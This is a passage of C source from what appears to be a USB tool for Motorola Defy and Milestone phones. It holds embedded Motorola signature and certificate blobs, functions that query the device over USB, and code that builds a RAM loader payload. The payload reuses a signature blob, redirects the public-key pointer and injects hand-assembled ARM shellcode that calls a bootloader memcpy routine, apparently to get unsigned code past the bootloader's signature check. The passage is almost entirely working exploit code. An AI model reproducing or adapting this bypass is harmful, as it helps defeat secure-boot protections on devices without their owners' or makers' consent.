    0x02, 0x4E, 0x4E, 0x7C, 0xAF, 0x21, 0xAC, 0xCE, 0xEE, 0x4D, 0x25, 0x3D, 0x2E, 0x0D, 0xD2, 0x52,
    0xB4, 0x0F, 0x33, 0x24, 0xEE, 0x75, 0x01, 0x02, 0x0C, 0x30, 0x00, 0x11, 0x01, 0x89, 0x07, 0x00,
    0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x03, 0xD3, 0x02, 0xAB, 0x56, 0xD6, 0x72, 0x89, 0xB8,
    0x61, 0xCD, 0x5E, 0xA7, 0x94, 0x48, 0xB8, 0xC0, 0x85, 0x0D, 0xC3, 0x46, 0xC5, 0x4D, 0x05, 0xBD,
    0x7A, 0x56, 0x74, 0x31, 0x65, 0x70, 0x47, 0x04, 0x95, 0x34, 0xC9, 0x24, 0xD2, 0x70, 0x9D, 0x7A,
    0x80, 0x96, 0xBC, 0x0D, 0x6B, 0x4F, 0x7E, 0xE8, 0xFC, 0x6B, 0x56, 0x7C, 0xA0, 0x40, 0xD8, 0xC9,
    0x04, 0x30, 0xDD, 0x0A, 0x0D, 0x7D, 0xC7, 0x83, 0xC2, 0xEB, 0xE8, 0x8D, 0xB4, 0x98, 0x9C, 0xDC,
    0x6A, 0x92, 0xDE, 0xC7, 0xCF, 0xE5, 0xB1, 0x51, 0x4D, 0x3F, 0x80, 0x6B, 0xDC, 0xC6, 0x18, 0xD5,
    0x6C, 0xFC, 0x4E, 0x0C, 0xF3, 0xE7, 0x2D, 0x5B, 0x84, 0xC2, 0xD9, 0x9F, 0xA1, 0x61, 0x49, 0x24,
    0x9D, 0x21, 0xCF, 0x93, 0xDF, 0x3C, 0x04, 0x6A, 0x46, 0x63, 0x33, 0xE8, 0x20, 0xE7, 0x9D, 0x5B,
    0xCE, 0x42, 0xA6, 0x9C, 0x2D, 0x87, 0xEB, 0x78, 0xB6, 0x7B, 0x01, 0x02, 0x01, 0x00, 0x04, 0x2E,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x48, 0x41, 0x42, 0x20, 0x43, 0x41, 0x20, 0x34, 0x37, 0x30, 0x4B, 0xB3,
    0x88, 0xB3, 0x67, 0xEA, 0xD3, 0x33, 0x01, 0x00, 0x04, 0x39, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F,
    0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74,
    0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53,
    0x46, 0x20, 0x43, 0x41, 0x20, 0x34, 0x37, 0x30, 0x2D, 0x31, 0x3B, 0x20, 0x53, 0x4E, 0x3D, 0x34,
    0x34, 0x38, 0x31, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00, 0x80, 0xCC, 0xEA, 0x26, 0x84,
    0xBC, 0xB3, 0x69, 0x29, 0xAA, 0xE4, 0x4A, 0x62, 0x7E, 0x91, 0x2D, 0x65, 0x35, 0x0B, 0x84, 0xE4,
    0x95, 0xBA, 0x58, 0xF8, 0x4B, 0x50, 0x87, 0x17, 0xD7, 0xAA, 0x8E, 0xDB, 0xBB, 0xD2, 0x7E, 0x11,
    0x90, 0x50, 0x34, 0x0E, 0x9C, 0x98, 0x0E, 0x8D, 0xAE, 0xD1, 0xDB, 0xB4, 0x56, 0xEC, 0x95, 0xFD,
    0x7B, 0xF1, 0x52, 0x1C, 0x71, 0x04, 0xC2, 0x3B, 0x01, 0xC0, 0x63, 0xEF, 0x51, 0xA0, 0xED, 0xE5,
    0x3D, 0xD0, 0xBC, 0x13, 0x54, 0x36, 0xFA, 0x51, 0x0D, 0x85, 0x02, 0xC4, 0x13, 0xBE, 0x91, 0x5B,
    0xBD, 0x32, 0x8C, 0x68, 0xB1, 0xC3, 0x36, 0x17, 0xCC, 0x93, 0xD7, 0x74, 0x9E, 0x56, 0xCA, 0x9F,
    0x6F, 0x41, 0x80, 0xDF, 0x7A, 0x55, 0x8B, 0xDA, 0xFA, 0xC1, 0xB2, 0x10, 0x13, 0x47, 0x82, 0xC1,
    0x6E, 0xBD, 0x76, 0x02, 0xF6, 0xEB, 0x19, 0x55, 0xEB, 0xB5, 0xEB, 0x8D, 0x00, 0x80, 0x48, 0x0C,
    0xEC, 0x43, 0xA9, 0xF9, 0xAC, 0x3E, 0x90, 0x43, 0x3F, 0x6A, 0xA0, 0x75, 0x06, 0x92, 0x1F, 0x63,
    0xC8, 0x00, 0xCD, 0xB2, 0xAA, 0x42, 0xE6, 0x87, 0x98, 0xF9, 0x74, 0xFA, 0xD2, 0xBB, 0xDE, 0x20,
    0xED, 0x9C, 0x51, 0x86, 0xB8, 0xA0, 0x1A, 0xC4, 0x44, 0x13, 0xF7, 0x7B, 0x01, 0xFD, 0x2C, 0x81,
    0x2E, 0x24, 0x46, 0xB9, 0x66, 0xAB, 0x0E, 0x41, 0x94, 0x15, 0x9B, 0x1A, 0xBE, 0xF5, 0x96, 0xB6,
    0x91, 0x59, 0xD5, 0xDD, 0x78, 0xDB, 0xBC, 0x4E, 0x1C, 0x59, 0xE3, 0x1C, 0x89, 0x18, 0x1D, 0x85,
    0xE3, 0xB9, 0x7D, 0xF3, 0x4C, 0x1C, 0x60, 0x4E, 0x8D, 0x4C, 0x0B, 0xC0, 0xD7, 0xC0, 0x61, 0xC9,
    0x5C, 0xB0, 0x04, 0x27, 0x6A, 0x90, 0x43, 0x59, 0x19, 0x3C, 0xA9, 0x07, 0x31, 0xBD, 0xA1, 0xCC,
    0xC0, 0x30, 0xA1, 0x0D, 0x7D, 0xE1, 0xA3, 0x0E, 0x37, 0x55, 0x1B, 0x06, 0x64, 0x71, 0x01, 0x02,
    0x01, 0x00, 0x04, 0x30, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49,
    0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20,
    0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53, 0x46, 0x20, 0x43, 0x41, 0x20, 0x34,
    0x37, 0x30, 0x2D, 0x31, 0x4B, 0xB3, 0x88, 0xD6, 0x67, 0xEA, 0xD3, 0x56, 0x01, 0x00, 0x04, 0x38,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x41, 0x50, 0x50, 0x20, 0x34, 0x37, 0x30, 0x2D, 0x31, 0x2D, 0x32, 0x3B,
    0x20, 0x53, 0x4E, 0x3D, 0x34, 0x34, 0x38, 0x33, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00,
    0x80, 0xD9, 0x85, 0xF0, 0xE5, 0xEF, 0x69, 0x91, 0x4A, 0xB4, 0x54, 0xB8, 0xF5, 0xAC, 0x29, 0x5C,
    0x46, 0x84, 0xD9, 0xCA, 0x80, 0xF7, 0x75, 0x7D, 0x58, 0x9E, 0x41, 0xD0, 0x7B, 0x50, 0x3E, 0x6B,
    0xAF, 0xC8, 0x1C, 0xC0, 0xC7, 0x70, 0x55, 0x18, 0x6A, 0x52, 0x41, 0xF9, 0x76, 0x05, 0x3C, 0x23,
    0x25, 0x34, 0x2B, 0xA4, 0x1B, 0xF1, 0xA8, 0xA3, 0x01, 0x66, 0x78, 0xE5, 0x8B, 0x86, 0xBF, 0xB7,
    0x93, 0xAB, 0x09, 0xC5, 0xFF, 0xA8, 0x0D, 0x00, 0xFB, 0xA1, 0xD4, 0x29, 0x3D, 0x5A, 0xF3, 0x90,
    0xE7, 0x4F, 0x4E, 0xB4, 0xB9, 0x9E, 0xA2, 0x3F, 0x98, 0x94, 0xF3, 0x21, 0x56, 0x90, 0xE3, 0xEF,
    0x29, 0xFC, 0x58, 0x21, 0x56, 0x37, 0x48, 0x44, 0x8A, 0xF0, 0x0A, 0x97, 0xB4, 0x07, 0x7C, 0x1B,
    0xDD, 0x8F, 0xEE, 0x66, 0x7F, 0x39, 0xFE, 0x54, 0xF2, 0xAB, 0xF3, 0xC4, 0xD9, 0x27, 0x07, 0xAC,
    0xFF, 0x00, 0x80, 0x4D, 0x6B, 0xF7, 0x83, 0x86, 0x08, 0x36, 0x8D, 0x08, 0x54, 0x1B, 0x7A, 0x53,
    0xC6, 0xD4, 0x3B, 0x99, 0xBB, 0xB7, 0x63, 0x53, 0x15, 0xB0, 0x27, 0x7B, 0x8C, 0x99, 0x3E, 0x48,
    0x9C, 0x54, 0x82, 0xC8, 0x43, 0xDA, 0x73, 0x54, 0x7D, 0x2D, 0x7D, 0x0C, 0x88, 0x9F, 0x9D, 0xF5,
    0xF5, 0x10, 0xD2, 0x8F, 0xA2, 0xF8, 0x45, 0x20, 0x6B, 0x42, 0x64, 0x52, 0x97, 0xD9, 0x18, 0xDE,
    0xBA, 0xE2, 0xFD, 0xE1, 0x5D, 0x8A, 0xAF, 0x90, 0xCA, 0x7D, 0xB9, 0xF2, 0x00, 0x94, 0xCA, 0xAF,
    0xEC, 0x7B, 0x64, 0xE7, 0x9D, 0xCF, 0x9A, 0x2D, 0x34, 0x51, 0x31, 0xE0, 0x34, 0xC7, 0x12, 0xEA,
    0xB4, 0xA7, 0xDE, 0xFF, 0x9D, 0xEE, 0xDD, 0x06, 0x1E, 0x7B, 0x3B, 0xF0, 0x44, 0x2A, 0xAF, 0x6C,
    0x66, 0x2A, 0x89, 0x4C, 0xF7, 0xB0, 0x7B, 0xC7, 0x6F, 0xE6, 0xE3, 0x1B, 0x91, 0x5B, 0xBC, 0xD7,
    0x2D, 0xF1, 0x52, 0x4E, 0xF5, 0x83, 0xED, 0x07, 0xC9, 0x15, 0x28, 0x28, 0x43, 0x1C, 0x4E, 0xB9,
    0x7D, 0x79, 0x4A, 0x45, 0x5A, 0x8F, 0x39, 0xAF, 0x55, 0xB9, 0xD9, 0x41, 0xCE, 0x8A, 0xB7, 0x8C,
    0xCF, 0x83, 0xD9, 0x23, 0x25, 0xCD, 0xEB, 0x9F, 0x07, 0x57, 0x15, 0x05, 0xC0, 0xD9, 0xDD, 0x5B,
    0x87, 0x95, 0xE2, 0xBC, 0x33, 0xB5, 0x7A, 0x45, 0x4C, 0xF3, 0xB3, 0xBD, 0xF5, 0xA5, 0xF8, 0x4A,
    0x4F, 0x11, 0x65, 0xCD, 0xCC, 0xE0, 0x83, 0xEC, 0xC6, 0x89, 0x3D, 0x9C, 0x11, 0x08, 0x14, 0x79,
    0xD9, 0x32, 0x1F, 0xCC, 0x74, 0xE7, 0x36, 0x1A, 0xB5, 0x24, 0x5D, 0x35, 0x56, 0x0C, 0x80, 0x3F,
    0x11, 0xB3, 0xFA, 0x22, 0xDF, 0xFF, 0x81, 0x8A, 0x3B, 0x2F, 0xEE, 0x3D, 0xBD, 0x8B, 0xB6, 0xE1,
    0x33, 0x37, 0xC3, 0xDF, 0x26, 0x20, 0xBA, 0x46, 0xC7, 0xE6, 0xB1, 0xFC, 0x96, 0x38, 0x9E, 0x0E,
    0xAB, 0x57, 0xA4
};


uint8_t cdt_signature_dx[] =
{
    0xB4, 0x01, 0x00, 0xCA, 0x02, 0x14, 0xDA, 0x95, 0x1B, 0x6D, 0xDC, 0x97, 0x07, 0xCE, 0x40, 0xEA,
    0x53, 0x0F, 0x90, 0x20, 0x91, 0xB5, 0x20, 0xDD, 0x2F, 0xF3, 0x00, 0x30, 0xFF, 0xFF, 0x00, 0x00,
    0x02, 0x4E, 0xE6, 0xB4, 0x04, 0xCF, 0xF6, 0x7E, 0x8F, 0x6F, 0xEC, 0xA6, 0x09, 0xB1, 0x06, 0x70,
    0x74, 0x41, 0xA6, 0x87, 0x6D, 0xDB, 0x01, 0x02, 0x0C, 0x30, 0x00, 0x11, 0x01, 0x89, 0x07, 0x00,
    0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x03, 0xD3, 0x02, 0x28, 0x71, 0x2B, 0x87, 0x5B, 0x11,
    0x9C, 0x22, 0x63, 0xFC, 0x56, 0x4E, 0xDD, 0x6A, 0x88, 0xB2, 0x54, 0x43, 0xD5, 0x4A, 0x98, 0x3A,
    0x61, 0x9E, 0x20, 0xCB, 0xD0, 0x9C, 0x32, 0xBC, 0x62, 0xB9, 0x1D, 0x35, 0xB5, 0xF4, 0x34, 0x99,
    0x93, 0x46, 0x62, 0xC7, 0x4A, 0xFE, 0x62, 0x95, 0x59, 0x70, 0x7D, 0x0E, 0x23, 0xEE, 0x9A, 0x60,
    0xC9, 0x29, 0x2A, 0xFC, 0xF5, 0xB6, 0x7B, 0x73, 0xBC, 0x0F, 0x58, 0xE2, 0x27, 0xA3, 0x3C, 0x49,
    0x20, 0xD3, 0x68, 0x1E, 0xB1, 0x93, 0xDD, 0x30, 0xB0, 0x0E, 0x35, 0x07, 0xBF, 0x37, 0xDA, 0xED,
    0xE3, 0x16, 0xD6, 0x98, 0x7F, 0xBA, 0x48, 0xF0, 0x72, 0x3F, 0xA9, 0x05, 0xAC, 0x67, 0xD1, 0x78,
    0xE8, 0xD3, 0x43, 0xEA, 0x30, 0x8D, 0x2C, 0xB4, 0x68, 0xBB, 0xC2, 0x83, 0x67, 0x9A, 0xBF, 0xEA,
    0xC7, 0xF2, 0x6D, 0x44, 0x13, 0x09, 0xB0, 0xBA, 0xAC, 0x20, 0x01, 0x02, 0x01, 0x00, 0x04, 0x2E,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x48, 0x41, 0x42, 0x20, 0x43, 0x41, 0x20, 0x34, 0x34, 0x37, 0x4A, 0xE5,
    0xEF, 0x4A, 0x67, 0x1D, 0x2B, 0xBA, 0x01, 0x00, 0x04, 0x39, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F,
    0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74,
    0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53,
    0x46, 0x20, 0x43, 0x41, 0x20, 0x34, 0x34, 0x37, 0x2D, 0x31, 0x3B, 0x20, 0x53, 0x4E, 0x3D, 0x34,
    0x31, 0x36, 0x33, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00, 0x80, 0xAA, 0x99, 0xEE, 0x61,
    0x1A, 0x2D, 0xB9, 0x2F, 0x0C, 0x15, 0x94, 0x65, 0x6F, 0xED, 0xDC, 0x6F, 0x65, 0xF7, 0x4F, 0xAD,
    0x7C, 0x38, 0x40, 0x63, 0x38, 0x82, 0xA8, 0x1B, 0x1A, 0x7F, 0xB2, 0x88, 0xBB, 0x27, 0x21, 0xF8,
    0xE0, 0x98, 0xCF, 0xD2, 0x4C, 0xB1, 0x09, 0xA3, 0x76, 0x03, 0xE1, 0x8A, 0xA9, 0x5E, 0x1B, 0x12,
    0x72, 0x80, 0x93, 0xBB, 0xDB, 0x62, 0x3C, 0x25, 0x9A, 0x5F, 0x80, 0x94, 0xAA, 0xC0, 0x56, 0x4E,
    0x8C, 0x74, 0x49, 0xBE, 0xFF, 0xCD, 0x8A, 0x23, 0x0F, 0xBE, 0x5C, 0x33, 0x11, 0xCD, 0x8F, 0x43,
    0xCD, 0x93, 0x02, 0x76, 0x01, 0xE1, 0x82, 0x02, 0xA5, 0xD4, 0xF8, 0x42, 0x0A, 0x7C, 0x19, 0xD5,
    0x8F, 0x69, 0x35, 0xAF, 0xF4, 0x9E, 0x28, 0xE9, 0xB4, 0x78, 0x19, 0x11, 0x9E, 0x1F, 0x7F, 0x08,
    0xD9, 0xB0, 0x5F, 0x85, 0x3A, 0x0D, 0xD0, 0x88, 0x5D, 0xEC, 0x9E, 0x15, 0x00, 0x80, 0x48, 0x9C,
    0x51, 0x60, 0x4B, 0x12, 0xD2, 0xF6, 0x3F, 0x63, 0xB2, 0x9F, 0xD1, 0x2E, 0xF3, 0x20, 0x9D, 0x17,
    0xC4, 0x36, 0xC5, 0x93, 0xE7, 0xA6, 0x5B, 0x58, 0xDD, 0x5B, 0x55, 0x91, 0x3A, 0x39, 0x9D, 0xB5,
    0xE3, 0xA9, 0x84, 0x99, 0x36, 0x0A, 0xCF, 0x13, 0xE1, 0xA6, 0xB4, 0x88, 0x02, 0xF5, 0xD4, 0xCC,
    0x4E, 0xA9, 0xC8, 0x33, 0x9D, 0x78, 0x3D, 0xCF, 0xC5, 0x15, 0xE9, 0xB4, 0x41, 0xEA, 0xCD, 0xCC,
    0xC9, 0xCF, 0x92, 0x7E, 0xF7, 0x3F, 0x3D, 0xB2, 0x48, 0x90, 0xD1, 0x56, 0x8F, 0xE5, 0xA1, 0x1F,
    0x73, 0xFD, 0x22, 0x3A, 0x09, 0x44, 0x6B, 0xC8, 0x38, 0xEC, 0x71, 0x78, 0xC8, 0x0A, 0x39, 0xCB,
    0x63, 0xB0, 0x9A, 0x72, 0x64, 0x5A, 0x1C, 0xFF, 0x50, 0xC7, 0x91, 0x05, 0xB1, 0x19, 0x4F, 0x97,
    0xD7, 0x9F, 0x2C, 0xCD, 0x9D, 0x98, 0x65, 0x74, 0x39, 0xF4, 0x46, 0xF1, 0xB0, 0x08, 0x01, 0x02,
    0x01, 0x00, 0x04, 0x30, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49,
    0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20,
    0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53, 0x46, 0x20, 0x43, 0x41, 0x20, 0x34,
    0x34, 0x37, 0x2D, 0x31, 0x4A, 0xE5, 0xEF, 0xEC, 0x67, 0x1D, 0x2C, 0x5C, 0x01, 0x00, 0x04, 0x38,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x41, 0x50, 0x50, 0x20, 0x34, 0x34, 0x37, 0x2D, 0x31, 0x2D, 0x32, 0x3B,
    0x20, 0x53, 0x4E, 0x3D, 0x34, 0x31, 0x36, 0x35, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00,
    0x80, 0xC4, 0x0A, 0xA4, 0xE1, 0xA5, 0xBF, 0xFD, 0x7A, 0xEB, 0x6D, 0xE8, 0x0F, 0x8B, 0x93, 0x6B,
    0x6E, 0x53, 0x64, 0x90, 0xBA, 0x4A, 0x63, 0x1F, 0x3F, 0x76, 0x2C, 0x94, 0x56, 0xD0, 0x6F, 0x1A,
    0xC8, 0xFB, 0x60, 0xDB, 0xCC, 0x77, 0xD6, 0xBC, 0xF9, 0xFC, 0x37, 0xA7, 0x71, 0x16, 0xBF, 0x05,
    0x24, 0x9A, 0x68, 0xFB, 0xB4, 0x32, 0x61, 0x1E, 0x01, 0x57, 0x52, 0x08, 0x70, 0x02, 0x54, 0xA2,
    0x5F, 0x25, 0xBE, 0xDC, 0x78, 0x5D, 0xBA, 0x32, 0xC4, 0x9C, 0xB5, 0xC2, 0xEB, 0xFC, 0xD7, 0xE0,
    0x8A, 0xBA, 0x60, 0x38, 0x18, 0x17, 0x4C, 0x3B, 0x8F, 0x9F, 0xB3, 0x30, 0xB5, 0x01, 0xAA, 0xE1,
    0x1D, 0x33, 0xDE, 0x29, 0x9F, 0xD9, 0x9B, 0x14, 0x8A, 0xF2, 0xBA, 0x46, 0x0A, 0x7D, 0x3D, 0x02,
    0x2D, 0x54, 0x7B, 0x33, 0x66, 0x02, 0x25, 0x29, 0x58, 0xB5, 0x6C, 0x87, 0x54, 0x5D, 0xE5, 0x6F,
    0x25, 0x00, 0x80, 0x15, 0x4F, 0x6C, 0xBA, 0x75, 0xA8, 0x07, 0x27, 0x91, 0xEA, 0x4D, 0xB7, 0x48,
    0x81, 0x83, 0xAD, 0x42, 0x24, 0x82, 0xC6, 0x05, 0xFD, 0xC0, 0x61, 0x4A, 0x17, 0x34, 0xD2, 0xDA,
    0x80, 0xAC, 0xE6, 0xBE, 0x91, 0xF5, 0x07, 0x42, 0x49, 0x25, 0xBA, 0x8E, 0x43, 0xF1, 0x5D, 0xBA,
    0x22, 0xA0, 0xF9, 0x1D, 0x6B, 0x6C, 0x74, 0xE8, 0x66, 0x6B, 0x2B, 0x88, 0x85, 0xC1, 0x74, 0x90,
    0x0D, 0x71, 0x57, 0x6F, 0xDB, 0xDE, 0x5A, 0xFA, 0x57, 0x28, 0x0B, 0xFC, 0x69, 0x18, 0x44, 0xF7,
    0x6D, 0x01, 0x48, 0x9E, 0x18, 0x7A, 0xB1, 0x8C, 0x80, 0xB1, 0x40, 0x0D, 0xEE, 0x56, 0x97, 0x7C,
    0xDD, 0xD3, 0xF7, 0x5B, 0xD3, 0x95, 0xE9, 0x70, 0x9E, 0xF9, 0x5E, 0xD9, 0x32, 0xEC, 0x05, 0x9D,
    0xA2, 0xA4, 0x5C, 0x08, 0xC8, 0xE8, 0xE6, 0x4D, 0x48, 0x35, 0xF6, 0x29, 0x13, 0xAB, 0x94, 0xF9,
    0x34, 0x6E, 0x59, 0x3A, 0xB5, 0x41, 0xA4, 0x73, 0x9C, 0xC6, 0x30, 0x23, 0x86, 0xC7, 0x3F, 0xB8,
    0x46, 0xF0, 0x09, 0xB2, 0x93, 0xE8, 0xBA, 0x61, 0xD8, 0x99, 0xB9, 0x6A, 0x2F, 0x56, 0xC2, 0x0D,
    0xF5, 0x27, 0x8F, 0xC6, 0xCD, 0x25, 0xE1, 0xDB, 0x05, 0xF2, 0xA5, 0x6F, 0xDB, 0x39, 0x7A, 0x7D,
    0x40, 0x06, 0xF6, 0x80, 0x16, 0x12, 0x09, 0x88, 0xFF, 0x97, 0xD0, 0xB3, 0xE3, 0xEF, 0x59, 0x62,
    0xC2, 0xFC, 0x24, 0x6E, 0xCB, 0x7A, 0xCB, 0xAF, 0xEE, 0xEF, 0xAA, 0x54, 0xA2, 0xF5, 0x68, 0x25,
    0x35, 0xFA, 0xEE, 0xB5, 0xE8, 0xC8, 0x77, 0x8B, 0x56, 0xA6, 0xD9, 0xB2, 0x31, 0xB7, 0xF3, 0x94,
    0x87, 0xA3, 0x4B, 0x11, 0x2A, 0x2B, 0x45, 0x3B, 0xFA, 0xB4, 0x33, 0xC5, 0x1F, 0x48, 0xF9, 0xC1,
    0x92, 0x42, 0x8A, 0x89, 0xFF, 0xED, 0x59, 0x21, 0x93, 0x6C, 0x2B, 0x58, 0xED, 0x73, 0xBC, 0xA5,
    0xA6, 0xE8, 0xB6
};

void rqinfo(usb_dev_handle* dev)
{
    char out[] = { 2, 'R', 'Q', 'I', 'N', 'F', 'O', 0x1e, 0, 3 };
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void rqsw(usb_dev_handle* dev)
{
    char out[] = { 2, 'R', 'Q', 'S', 'W', 3 };
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void rquid(usb_dev_handle* dev)
{
    char out[] = { 2, 'R', 'Q', 'U', 'I', 'D', 0x1e, '0', 0, '0', 0, 3 };
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

uint16_t rqvn(usb_dev_handle* dev)
{
    char out[] = { 2, 'R', 'Q', 'V', 'N', 3 };
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");

    char ver[] = { tmp[20], tmp[21], tmp[18], tmp[19], 0 };

    return strtol(ver, 0, 16);
}

#pragma pack(push, 1)
struct ramldr
{
    uint32_t entrypoint;
    uint32_t magic;
    uint32_t field_8;
    uint32_t field_C;
    uint32_t public_key;
    uint32_t field_14;
    uint32_t field_18;
    uint32_t field_1C;
    uint32_t fuse_level;
    uint32_t field_24;
    uint32_t field_28;
    uint32_t signature;
};
#pragma pack(pop)

void genPayloadDefy(uint8_t* buff)
{
    ramldr* hdr = (ramldr*)buff;

    hdr->entrypoint = 0x820001AB; // entry point, range chacked
    hdr->magic = 0xB17219E9; // hardcoded magic
    hdr->public_key = 0x89311290; // Let's use the public key inside the mbm
    hdr->signature = 0x82000030; // signature, range chacked

    memcpy(&buff[0x30], cdt_signature_defy, sizeof(cdt_signature_defy));

    uint8_t callmemcpy[] = {
        //MOV LR, 1
        0x4F, 0xF0, 0x01, 0x0E,
        //MOVT LR, 0x8200
        0xC8, 0xF2, 0x00, 0x2E,
        //MOV R0, 0x2000
        0x42, 0xF2, 0x00, 0x00,
        //MOVT R0, 0x8200
        0xC8, 0xF2, 0x00, 0x20,
        //MOV R1, 0
        0x4F, 0xF0, 0x00, 0x01,
        //MOVT R1, 0x8200
        0xC8, 0xF2, 0x00, 0x21,
        //MOV R2, 0
        0x4F, 0xF0, 0x00, 0x02,
        //MOVT R2, 0x0004
        0xC0, 0xF2, 0x04, 0x02,
        //MOV R3, 0xB744
        0x4B, 0xF2, 0x44, 0x73,
        //MOVT R3, 0x8931
        0xC8, 0xF6, 0x31, 0x13,
        //BX R3
        0x18, 0x47,
    };

    memcpy(&buff[0x50E], callmemcpy, sizeof(callmemcpy));
}

void genPayloadMS(uint8_t* buff)
{
    ramldr* hdr = (ramldr*)buff;

    hdr->entrypoint = 0x82001169; // entry point, range chacked
